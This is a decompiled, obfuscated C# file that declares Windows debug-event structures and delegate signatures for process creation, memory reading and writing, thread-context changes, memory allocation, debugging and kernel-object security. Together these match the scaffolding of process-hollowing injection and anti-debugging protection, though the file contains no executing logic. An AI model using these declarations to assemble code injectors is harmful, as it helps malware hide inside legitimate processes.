using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;

namespace ns3;

[StandardModule]
internal sealed class Class20
{
	[Flags]
	public enum Enum0
	{
		flag_0 = 1,
		flag_1 = 2,
		flag_2 = 8,
		flag_3 = 0x10,
		flag_4 = 0x20,
		flag_5 = 0x40,
		flag_6 = 0x80,
		flag_7 = 0x100,
		flag_8 = 0x200
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct Struct0
	{
		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public uint uint_0;

		private uint uint_1;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct Struct1
	{
		public uint uint_0;

		private string string_0;

		private string string_1;

		private string string_2;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
		private byte[] byte_0;

		private IntPtr intptr_0;

		private IntPtr intptr_1;

		private IntPtr intptr_2;

		private IntPtr intptr_3;
	}

	public struct Struct2
	{
		public Enum1 enum1_0;

		public int int_0;

		public int int_1;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 86, ArraySubType = UnmanagedType.U1)]
		public byte[] byte_0;

		public Struct4 Exception => method_0<Struct4>();

		public Struct3 CreateThread => method_0<Struct3>();

		public Struct11 CreateProcessInfo => method_0<Struct11>();

		public Struct6 ExitThread => method_0<Struct6>();

		public Struct7 ExitProcess => method_0<Struct7>();

		public Struct10 LoadDll => method_0<Struct10>();

		public Struct8 UnloadDll => method_0<Struct8>();

		public Struct9 DebugString => method_0<Struct9>();

		public Struct12 RipInfo => method_0<Struct12>();

		private T method_0<T>() where T : struct
		{
			int num = Marshal.SizeOf(typeof(T));
			IntPtr intPtr = Marshal.AllocHGlobal(num);
			Marshal.Copy(byte_0, 0, intPtr, num);
			object objectValue = RuntimeHelpers.GetObjectValue(Marshal.PtrToStructure(intPtr, typeof(T)));
			Marshal.FreeHGlobal(intPtr);
			return (T)objectValue;
		}

		internal static bool wM0Je2bGcnZN0d91Ql()
		{
			return true;
		}

		internal static bool C8w8aqq24IvKOByNcy()
		{
			return false;
		}
	}

	public enum Enum1
	{
		const_0 = 3,
		const_1 = 2,
		const_2 = 1,
		const_3 = 5,
		const_4 = 4,
		const_5 = 6,
		const_6 = 8,
		const_7 = 9,
		const_8 = 7
	}

	[Flags]
	public enum Enum2 : uint
	{
		flag_0 = 0x40u,
		flag_1 = 0x100u
	}

	public struct Struct3
	{
		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public Delegate17 delegate17_0;
	}

	public struct Struct4
	{
		public Struct5 struct5_0;

		public uint uint_0;
	}

	public struct Struct5
	{
		public uint uint_0;

		public uint uint_1;

		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public uint uint_2;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)]
		public uint[] uint_3;
	}

	public struct Struct6
	{
		public uint uint_0;
	}

	public struct Struct7
	{
		public uint uint_0;
	}

	public struct Struct8
	{
		public IntPtr intptr_0;
	}

	public struct Struct9
	{
		[MarshalAs(UnmanagedType.LPStr)]
		public string string_0;

		public ushort ushort_0;

		public ushort ushort_1;
	}

	public struct Struct10
	{
		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public uint uint_0;

		public uint uint_1;

		public IntPtr intptr_2;

		public ushort ushort_0;
	}

	public struct Struct11
	{
		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public IntPtr intptr_2;

		public IntPtr intptr_3;

		public uint uint_0;

		public uint uint_1;

		public IntPtr intptr_4;

		public Delegate17 delegate17_0;

		public IntPtr intptr_5;

		public ushort ushort_0;
	}

	public struct Struct12
	{
		public uint uint_0;

		public uint uint_1;
	}

	public delegate bool Delegate1(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

	public delegate bool Delegate2(IntPtr hProcess, uint dwAddress, int nSize, uint flNewProtect, ref uint lpflOldProtect);

	public delegate bool Delegate3(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref Struct1 startupInfo, ref Struct0 processInformation);

	public delegate bool Delegate4(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

	public delegate bool Delegate5(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

	public delegate bool Delegate6(IntPtr thread, int[] context);

	public delegate uint Delegate7(IntPtr thread, int[] context);

	public delegate int Delegate8(IntPtr process, int baseAddress);

	public delegate int Delegate9(IntPtr handle, int address, int length, int type, int protect);

	public delegate int Delegate10(IntPtr handle, out uint SuspendCount);

	public delegate bool Delegate11(int dwProcessId);

	public delegate bool Delegate12(out Struct2 lpDebugEvent, int dwMilliseconds);

	public delegate bool Delegate13([In] bool KillOnExit);

	public delegate bool Delegate14(int dwProcessId, int dwThreadId, int dwContinueStatus);

	public delegate bool Delegate15(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

	public delegate bool Delegate16(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, ref uint lpnLengthNeeded);

	public delegate uint Delegate17(IntPtr lpThreadParameter);
}
